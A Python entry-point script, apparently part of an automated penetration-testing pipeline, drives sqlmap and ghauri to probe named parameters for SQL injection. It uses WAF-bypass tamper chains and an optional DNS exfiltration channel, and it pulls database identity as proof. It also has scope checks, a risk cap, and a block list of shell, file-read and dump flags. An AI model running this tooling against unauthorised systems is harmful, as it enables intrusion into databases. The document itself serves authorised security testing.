#!/usr/bin/env python3
"""
run.py -- sqli-database-injection entry point.

Tests specific parameters for SQL injection using error, boolean-differential,
time-based, union, and (optional) OOB methods, selecting WAF-bypass tamper
chains from the Phase 2 tech fingerprint and confirming findings by dual-method
agreement. Wraps ghauri (preferred) and sqlmap.

SAFETY MODEL (this is an offensive skill -- the guardrails are load-bearing)
---------------------------------------------------------------------------
* Detection + minimal proof ONLY. Techniques are limited to BEUT
  (Boolean/Error/Union/Time) -- all read-only SELECT inference. Stacked
  queries ('S') are stripped: no arbitrary statement execution.
* NEVER destructive / RCE. --os-shell, --os-pwn, --sql-shell, --file-read/write,
  --dump*, --dbs, --passwords, --udf-inject and friends are blocklisted; a
  _assert_safe() guard refuses to launch any argv containing them, whatever the
  config says.
* Proof is DB identity metadata (--banner, --current-user, --current-db,
  --is-dba) -- demonstrated impact without exfiltrating table data. Table dumps
  are out of scope for this skill (a separate, human-gated action).
* Risk capped at 2, level default 2. Scope-gated: only the in-scope target host
  is ever tested; otherwise a fatal artifact is returned before any tool runs.
* Dual-method confirmation: a parameter is 'confirmed' only when >=2 independent
  methods (or both tools) agree; a single method is 'suspected'.

CONTRACT
--------
* Input  : {"target_url": "...", "parameters": ["id"], "waf_detected": false,
            "oob_domain": "abc.oast.pro", "dbms": "MySQL",
            "scope_policy_spill_id": "...", "config": {...}}
* Output : one strict JSON artifact on stdout (references/ARTIFACT_SCHEMA.md).
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import shutil
import sys
import tempfile
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlsplit

try:
    from spill_store import read_spill, write_spill
except ImportError:  # pragma: no cover
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from spill_store import read_spill, write_spill  # type: ignore

# --- Safety constants ---------------------------------------------------------
# Time-based blind first (M13 P2b): the most reliable single-method signal against a
# WAF'd / non-verbose target, and the primary anomaly the deterministic signal extractor keys on.
# NEVER 'S' (stacked) — that stays banned by _assert_safe below.
SAFE_TECHNIQUES = "TBEU"          # Time, Boolean, Error, Union.
MAX_RISK = 2                      # Load-bearing safety cap — do NOT raise (no destructive risk 3).
DEFAULT_LEVEL = 3                 # Deeper probing surfaces suspected_confirmed evidence (M13 P2b).
# Seconds sqlmap/ghauri waits on a time-based payload; matches the extractor's >3s slow-response cut.
DEFAULT_TIME_SEC = 5
TOOL_TIMEOUT = int(os.environ.get("SQLI_TOOL_TIMEOUT", "600"))
# Any of these tokens in a constructed argv aborts the run (defense in depth).
BLOCKED_FLAGS = (
    "--os-shell", "--os-pwn", "--os-cmd", "--os-smbrelay", "--sql-shell",
    "--sql-query", "--file-read", "--file-write", "--file-dest", "--dump",
    "--dump-all", "--dbs", "--passwords", "--udf-inject", "--reg-add",
    "--reg-write", "--eval", "--priv-esc", "--all",
)
# Read-only identity/metadata enumeration used as proof-of-impact.
PROOF_FLAGS = ["--banner", "--current-user", "--current-db", "--is-dba", "--hostname"]

# WAF/DBMS-aware tamper selection (sqlmap tamper script names).
TAMPER_BASE = ["space2comment", "randomcase"]
TAMPER_BY_DBMS = {
    "mysql": ["space2comment", "randomcase", "charencode", "between", "modsecurityversioned"],
    "mssql": ["space2comment", "randomcase", "charencode", "between", "modsecurityzeroversioned"],
    "postgresql": ["space2comment", "randomcase", "charencode", "between"],
    "oracle": ["space2comment", "randomcase", "charencode", "between"],
    "sqlite": ["space2comment", "randomcase", "charencode"],
}


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _host_of(url: str) -> str:
    try:
        return (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""


class ScopePolicy:
    def __init__(self, policy: Optional[dict], target_host: str):
        self.raw = policy or {}
        self.have_policy = policy is not None
        self.in_scope = [self._c(p) for p in self.raw.get("in_scope", [])]
        self.out_scope = [self._c(p) for p in self.raw.get("out_of_scope", [])]
        if not self.in_scope and target_host:
            self.in_scope = [self._c(target_host), self._c(f"*.{target_host}")]

    @staticmethod
    def _c(pattern: str) -> re.Pattern:
        p = pattern.strip().lower().rstrip(".")
        if p.startswith("*."):
            return re.compile(rf"^([a-z0-9_-]+\.)*{re.escape(p[2:])}$")
        return re.compile(rf"^{re.escape(p)}$")

    def allowed(self, host: str) -> bool:
        h = (host or "").strip().lower()
        if not h:
            return False
        if any(rx.match(h) for rx in self.out_scope):
            return False
        return any(rx.match(h) for rx in self.in_scope)


class UnsafeInvocation(Exception):
    pass


def _assert_safe(argv: List[str]) -> None:
    """Defense in depth: refuse to launch any command carrying a blocked flag,
    a stacked-query technique, or risk > 2."""
    joined = " ".join(argv)
    for bad in BLOCKED_FLAGS:
        if bad in argv or f"{bad}=" in joined:
            raise UnsafeInvocation(f"blocked flag present: {bad}")
    for i, tok in enumerate(argv):
        if tok == "--technique" and i + 1 < len(argv) and "S" in argv[i + 1].upper():
            raise UnsafeInvocation("stacked-query technique 'S' is not permitted")
        if tok.startswith("--technique=") and "S" in tok.split("=", 1)[1].upper():
            raise UnsafeInvocation("stacked-query technique 'S' is not permitted")
        m = re.match(r"--risk[=\s]?(\d+)", tok)
        if m and int(m.group(1)) > MAX_RISK:
            raise UnsafeInvocation(f"risk {m.group(1)} exceeds cap {MAX_RISK}")


class SQLiTester:
    def __init__(self, target_url: str, parameters: List[str], waf_detected: bool = False,
                 oob_domain: Optional[str] = None, dbms: Optional[str] = None,
                 scope_policy_spill_id: Optional[str] = None,
                 tech_fingerprint_spill_id: Optional[str] = None,
                 config: Optional[dict] = None,
                 method: str = "GET", body: object = None, content_type: Optional[str] = None,
                 parameter: Optional[str] = None, cookies: object = None,
                 auth_headers: Optional[dict] = None):
        self.target_url = target_url.strip()
        self.target_host = _host_of(self.target_url)
        # Concrete request shape (M11 adaptive contract): a caller can now say "POST /login with
        # JSON body {email:*} and these cookies", so the wrapped CLI reaches a real injection
        # point instead of GET-probing the query string.
        self.method = (method or "GET").upper()
        self.body = body
        self.content_type = (content_type or "").lower()
        self.parameter = (parameter or "").strip() or None
        self.cookies = cookies
        self.auth_headers = auth_headers or {}
        self.parameters = [p for p in (parameters or []) if p]
        if not self.parameters:
            if self.parameter:
                self.parameters = [self.parameter]
            elif isinstance(self.body, dict):
                self.parameters = [str(k) for k in self.body]
        self.waf = bool(waf_detected)
        self.oob_domain = (oob_domain or "").strip() or None
        self.config = config or {}
        self.dbms = (dbms or self.config.get("dbms") or "").strip() or None
        self.level = int(self.config.get("level", DEFAULT_LEVEL))
        self.risk = min(int(self.config.get("risk", MAX_RISK)), MAX_RISK)
        # Time-based delay (bounded 1..10s) — clamp so a bad config can't hang the runner.
        self.time_sec = max(1, min(10, int(self.config.get("time_sec", DEFAULT_TIME_SEC))))
        self.technique = "".join(c for c in self.config.get("technique", SAFE_TECHNIQUES).upper()
                                 if c in "BEUT")  # strip anything not BEUT (drops 'S')
        if not self.technique:
            self.technique = SAFE_TECHNIQUES
        self.errors: List[Dict[str, str]] = []
        # tech fingerprint can supply the dbms hint (fewer payloads = gentler)
        if tech_fingerprint_spill_id:
            try:
                fp = read_spill(tech_fingerprint_spill_id)
                if not self.dbms and isinstance(fp, dict):
                    known = ("mysql", "mariadb", "postgresql", "postgres", "mssql",
                             "sql server", "oracle", "sqlite")
                    for c in fp.get("stack", []) or []:
                        name = (c.get("component") or "").lower()
                        if c.get("category") == "database" or any(k in name for k in known):
                            self.dbms = c.get("component")
                            break
                if isinstance(fp, dict) and fp.get("waf", {}).get("detected"):
                    self.waf = True
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "tech_fp", "error": str(exc)})
        policy = None
        if scope_policy_spill_id:
            try:
                policy = read_spill(scope_policy_spill_id)
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "scope_load", "error": str(exc)})
        self.scope = ScopePolicy(policy, self.target_host)

    # -- tamper selection ------------------------------------------------------
    def select_tampers(self) -> List[str]:
        if not self.waf:
            return []
        key = (self.dbms or "").lower()
        for k, v in TAMPER_BY_DBMS.items():
            if k in key:
                return v
        return TAMPER_BASE

    # -- concrete request shaping (M11) ----------------------------------------
    def _cookie_str(self) -> str:
        """Render cookies (str | dict | list[{name,value}]) as a 'k=v; k2=v2' header value."""
        if isinstance(self.cookies, str):
            return self.cookies
        if isinstance(self.cookies, dict):
            return "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        if isinstance(self.cookies, list):
            return "; ".join(
                f"{c.get('name')}={c.get('value')}" for c in self.cookies if isinstance(c, dict)
            )
        return ""

    def _data_for(self, param: str) -> Optional[str]:
        """Serialise the POST body with a '*' sqlmap injection marker at ``param``."""
        if self.body is None:
            return None
        if not isinstance(self.body, dict):
            return str(self.body)
        marked = {k: ("*" if k == param else v) for k, v in self.body.items()}
        if self.content_type in ("json", "application/json"):
            return json.dumps(marked)
        return "&".join(f"{k}={v}" for k, v in marked.items())

    def _request_flags(self, param: str, *, ghauri: bool = False) -> List[str]:
        """Extra CLI flags that carry the concrete method/body/cookies/auth to sqlmap|ghauri."""
        flags: List[str] = []
        data = self._data_for(param)
        if data is not None:
            flags.append(f"--data={data}")
        if self.method != "GET" and not ghauri:
            flags.append(f"--method={self.method}")  # ghauri infers POST from --data
        cookie = self._cookie_str()
        if cookie:
            flags.append(f"--cookie={cookie}")
        headers = list(self.auth_headers.items())
        if data is not None and self.content_type in ("json", "application/json"):
            headers.append(("Content-Type", "application/json"))
        for key, value in headers:
            flags.append("--headers" if ghauri else "-H")
            flags.append(f"{key}: {value}")
        return flags

    # -- argv builders (safe by construction) ----------------------------------
    def _sqlmap_argv(self, param: str, out_dir: str) -> List[str]:
        argv = ["sqlmap", "-u", self.target_url, "-p", param,
                "--batch", f"--level={self.level}", f"--risk={self.risk}",
                f"--technique={self.technique}", f"--time-sec={self.time_sec}", "--flush-session",
                "--disable-coloring", f"--output-dir={out_dir}"]
        argv += self._request_flags(param)
        if self.dbms:
            argv += [f"--dbms={self.dbms}"]
        tampers = self.select_tampers()
        if tampers:
            argv += [f"--tamper={','.join(tampers)}"]
        if self.oob_domain:
            argv += [f"--dns-domain={self.oob_domain}"]   # DNS exfil detection channel
        argv += PROOF_FLAGS
        _assert_safe(argv)
        return argv

    def _ghauri_argv(self, param: str) -> List[str]:
        argv = ["ghauri", "-u", self.target_url, "-p", param, "--batch",
                f"--level={self.level}", f"--timesec={self.time_sec}", "--confirm",
                "--current-user", "--current-db", "--banner"]
        argv += self._request_flags(param, ghauri=True)
        if self.dbms:
            argv += ["--dbms", self.dbms]
        tampers = self.select_tampers()
        if tampers:
            argv += ["--tamper", ",".join(tampers)]
        _assert_safe(argv)
        return argv

    # -- process runner --------------------------------------------------------
    async def _exec(self, argv: List[str]) -> Tuple[int, str, str]:
        if shutil.which(argv[0]) is None:
            return (127, "", f"{argv[0]} not found on PATH")
        try:
            proc = await asyncio.create_subprocess_exec(
                *argv, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            try:
                out, err = await asyncio.wait_for(proc.communicate(), TOOL_TIMEOUT)
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()
                return (124, "", f"timeout after {TOOL_TIMEOUT}s")
            return (proc.returncode or 0, out.decode("utf-8", "replace"),
                    err.decode("utf-8", "replace"))
        except Exception as exc:  # noqa: BLE001
            return (1, "", str(exc))

    async def run_sqlmap(self, param: str) -> dict:
        out_dir = tempfile.mkdtemp(prefix="sqlmap_")
        try:
            argv = self._sqlmap_argv(param, out_dir)
        except UnsafeInvocation as exc:
            self.errors.append({"stage": "sqlmap_guard", "error": str(exc)})
            return {"tool": "sqlmap", "param": param, "types": [], "raw": "", "blocked": str(exc)}
        rc, out, err = await self._exec(argv)
        parsed = self.parse_tool_output(out + "\n" + err, param)
        parsed.update({"tool": "sqlmap", "param": param,
                       "raw": out + "\n---STDERR---\n" + err, "argv": argv,
                       "available": shutil.which("sqlmap") is not None,
                       "output_dir": out_dir})
        return parsed

    async def run_ghauri(self, param: str) -> dict:
        try:
            argv = self._ghauri_argv(param)
        except UnsafeInvocation as exc:
            self.errors.append({"stage": "ghauri_guard", "error": str(exc)})
            return {"tool": "ghauri", "param": param, "types": [], "raw": "", "blocked": str(exc)}
        rc, out, err = await self._exec(argv)
        parsed = self.parse_tool_output(out + "\n" + err, param)
        parsed.update({"tool": "ghauri", "param": param,
                       "raw": out + "\n---STDERR---\n" + err, "argv": argv,
                       "available": shutil.which("ghauri") is not None})
        return parsed

    # -- output parsing (sqlmap/ghauri share these markers) --------------------
    _TYPE_MAP = [
        (re.compile(r"boolean-based", re.I), "boolean"),
        (re.compile(r"error-based", re.I), "error"),
        (re.compile(r"time-based", re.I), "time"),
        (re.compile(r"UNION query|union-based", re.I), "union"),
        (re.compile(r"inline query", re.I), "union"),
    ]

    def parse_tool_output(self, text: str, param: str) -> dict:
        types: List[str] = []
        # only consider the injection block for THIS parameter
        blocks = re.split(r"Parameter:\s*", text)
        target_block = text
        for b in blocks[1:]:
            if b.strip().lower().startswith(param.lower()):
                target_block = b
                break
        for line in target_block.splitlines():
            m = re.search(r"Type:\s*(.+)", line)
            if m:
                for rx, t in self._TYPE_MAP:
                    if rx.search(m.group(1)):
                        if t not in types:
                            types.append(t)
        # ghauri-style: "[+] parameter 'id' is vulnerable" + separate type lines
        if not types and re.search(rf"parameter '?{re.escape(param)}'? is (?:vulnerable|injectable)", text, re.I):
            for rx, t in self._TYPE_MAP:
                if rx.search(text) and t not in types:
                    types.append(t)
        # OOB / DNS exfiltration signal
        if self.oob_domain and re.search(r"DNS exfiltration|dns-domain|OOB", text, re.I):
            if "oob" not in types:
                types.append("oob")
        dbms = None
        md = re.search(r"back-end DBMS:\s*([^\n]+)", text, re.I)
        if md:
            dbms = md.group(1).strip()
        elif self.dbms:
            dbms = self.dbms
        proof = {}
        for label, key in (("banner", "banner"), ("current user", "current_user"),
                           ("current database", "current_db"), ("current db", "current_db"),
                           ("current-user", "current_user")):
            pm = re.search(rf"{label}:\s*'?([^\n']+)'?", text, re.I)
            if pm:
                proof[key] = pm.group(1).strip().strip("'")
        return {"types": types, "dbms": dbms, "proof": proof}

    # -- dual-method confirmation ----------------------------------------------
    def verify_dual_method(self, per_param: Dict[str, dict]) -> str:
        """confirmed if >=2 distinct injection methods agree (across tools)."""
        distinct = {t for t in per_param["types"] if t in ("boolean", "error", "time", "union", "oob")}
        return "confirmed" if len(distinct) >= 2 else "suspected"

    # -- orchestration ---------------------------------------------------------
    async def run(self) -> dict:
        started = time.time()
        if not self.scope.allowed(self.target_host):
            self.errors.append({"stage": "scope", "error": f"{self.target_host} not in scope"})
            return self._artifact([], started, fatal=True)
        if not self.parameters:
            self.errors.append({"stage": "input", "error": "no parameters supplied"})
            return self._artifact([], started, fatal=True)

        prefer_ghauri = self.config.get("prefer_ghauri", True)
        tampers_used = ",".join(self.select_tampers()) if self.waf else ""
        findings: List[dict] = []

        for param in self.parameters:
            # per-parameter aggregation across whichever tools are available
            agg = {"types": [], "dbms": None, "proof": {}, "raws": {}, "tools": []}
            runners = [self.run_ghauri, self.run_sqlmap] if prefer_ghauri else \
                      [self.run_sqlmap, self.run_ghauri]
            for runner in runners:
                res = await runner(param)
                if res.get("blocked"):
                    continue
                if res.get("available") and res.get("raw"):
                    agg["tools"].append(res["tool"])
                    agg["raws"][res["tool"]] = res["raw"]
                for t in res.get("types", []):
                    if t not in agg["types"]:
                        agg["types"].append(t)
                if res.get("dbms") and not agg["dbms"]:
                    agg["dbms"] = res["dbms"]
                agg["proof"].update(res.get("proof") or {})
                # if the first tool already confirmed >=2 methods, skip the second
                if len({t for t in agg["types"] if t in ("boolean", "error", "time", "union")}) >= 2:
                    break

            if not agg["types"]:
                continue
            raw_log_spill_id = write_spill({"param": param, "tools": agg["tools"],
                                            "logs": agg["raws"], "proof": agg["proof"]})
            confidence = self.verify_dual_method(agg)
            for itype in agg["types"]:
                findings.append({
                    "parameter": param,
                    "injection_type": itype,
                    "confidence": confidence,
                    "dbms": agg["dbms"] or (self.dbms or ""),
                    "waf_bypass_used": tampers_used,
                    "raw_log_spill_id": raw_log_spill_id,
                    "proof": agg["proof"],
                })
        return self._artifact(findings, started)

    def _artifact(self, findings: List[dict], started: float, fatal: bool = False) -> dict:
        confirmed = sum(1 for f in findings if f["confidence"] == "confirmed")
        return {
            "findings": findings,
            "meta": {
                "skill": "sqli-database-injection", "version": "1.0", "phase": "5",
                "status": "error" if fatal else "ok",
                "generated_at": _now_iso(),
                "duration_seconds": round(time.time() - started, 2),
                "target_host": self.target_host,
                "parameters_tested": self.parameters,
                "technique": self.technique, "risk": self.risk, "level": self.level,
                "waf_aware": self.waf,
                "safety": {"techniques": self.technique, "stacked_queries": False,
                           "table_dumps": False, "destructive": False,
                           "risk_cap": MAX_RISK},
                "confirmed_findings": confirmed,
                "suspected_findings": len(findings) - confirmed,
            },
            "scope_summary": {"policy_present": self.scope.have_policy,
                              "target_host": self.target_host},
            "errors": self.errors,
        }


# --- entry point -------------------------------------------------------------
def _load_input(argv: List[str]) -> dict:
    raw = ""
    if len(argv) > 1 and argv[1].strip():
        raw = argv[1]
    elif not sys.stdin.isatty():
        raw = sys.stdin.read()
    raw = raw.strip()
    if not raw:
        raise ValueError("no input: expected JSON {\"target_url\":\"...\",\"parameters\":[...]}")
    obj = json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("input must be a JSON object")
    return obj


def _error_artifact(message: str) -> dict:
    return {
        "findings": [],
        "meta": {"skill": "sqli-database-injection", "version": "1.0", "phase": "5",
                 "status": "error", "generated_at": _now_iso()},
        "errors": [{"stage": "init", "error": message}],
    }


async def _amain(argv: List[str]) -> int:
    try:
        payload = _load_input(argv)
    except Exception as exc:  # noqa: BLE001
        print(json.dumps(_error_artifact(f"input error: {exc}")))
        return 2
    target = str(payload.get("target_url", "")).strip()
    if not target or urlsplit(target).scheme not in ("http", "https"):
        print(json.dumps(_error_artifact("invalid 'target_url' (need http(s) URL)")))
        return 2
    tester = SQLiTester(
        target_url=target,
        parameters=payload.get("parameters") or [],
        waf_detected=payload.get("waf_detected", False),
        oob_domain=payload.get("oob_domain"),
        dbms=payload.get("dbms"),
        scope_policy_spill_id=payload.get("scope_policy_spill_id"),
        tech_fingerprint_spill_id=payload.get("tech_fingerprint_spill_id"),
        config=payload.get("config"),
        method=payload.get("method", "GET"),
        body=payload.get("body", payload.get("data")),
        content_type=payload.get("content_type"),
        parameter=payload.get("parameter"),
        cookies=payload.get("cookies"),
        auth_headers=payload.get("auth_headers"),
    )
    artifact = await tester.run()
    print(json.dumps(artifact, ensure_ascii=False))
    return 0


def main() -> int:
    return asyncio.run(_amain(sys.argv))


if __name__ == "__main__":
    raise SystemExit(main())
